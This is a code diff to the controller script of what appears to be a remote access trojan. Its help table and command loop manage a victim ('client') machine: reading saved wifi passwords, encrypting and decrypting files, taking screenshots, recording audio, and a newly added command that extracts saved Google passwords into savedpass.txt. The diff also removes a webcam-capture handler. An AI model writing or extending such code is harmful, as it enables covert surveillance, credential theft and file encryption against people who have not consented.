@@ -52,8 +52,9 @@ Commands      Desscription
 :check        Check if client machine is connected to internet
 :wifi         Show Client machine wifi info [names,passwod,etc]
 :browse       Open an website on client machine browser
-:encrypt      Encrypt a file on a client machine
-:decrypt      Decrypt a file on a client machine
+:encrypt      Encrypt a file on a client machine e.g :encrypt <filename> 
+:decrypt      Decrypt a file on a client machine e.g :decrypt <filename.enc.dec>
+:passwords    Extract client's google saved passwords
 pwd           Print working directory in client machine
 cd -          Switch back to previous directory in client machine
 cd --         Switch back to first directory when connection was established with client machine
@@ -175,20 +176,6 @@ def screenshot():
             f.write(image)
 
 
-def webcam():
-    
-    file_name = str(datetime.now().time())
-
-    file_name = file_name.split(".")[0].replace(":", "-")
-    file_name = file_name + '.png'
-    with open(file_name, "wb") as f:
-        webimage = controler.recv()
-        f.write(webimage)
-        while not ("completeServing" in str(webimage)):
-            webimage = controler.recv()
-            f.write(webimage)
-
-
 
 
 def recording():
@@ -235,9 +222,6 @@ def control():
       elif ":upload" in cmd:
            upload(cmd)
            control()
-      #elif ":delete" in cmd:
-           #delete(cmd)
-           #control()
       elif cmd ==":kill":
          print("[!] Connection has been killed!")
          controler.send(b":kill")
@@ -274,7 +258,6 @@ def control():
         controler.send(b":passwords")
         
         try:
-          #file_data = file_data.decode("UTF-8","ignore")
           with open(f'savedpass.txt','wb') as f:
             file_data = controler.recv()
             f.write(file_data)
@@ -296,10 +279,6 @@ def control():
           control()
       elif "sound" in DATA.decode("utf-8", "ignore"):
           recording()
-          print("done")
-          control()
-      elif "webimage" in DATA.decode("utf-8", "ignore"):
-          webcam()
           print("done")
           control()
       elif "delete" in DATA.decode("utf-8", "ignore"):
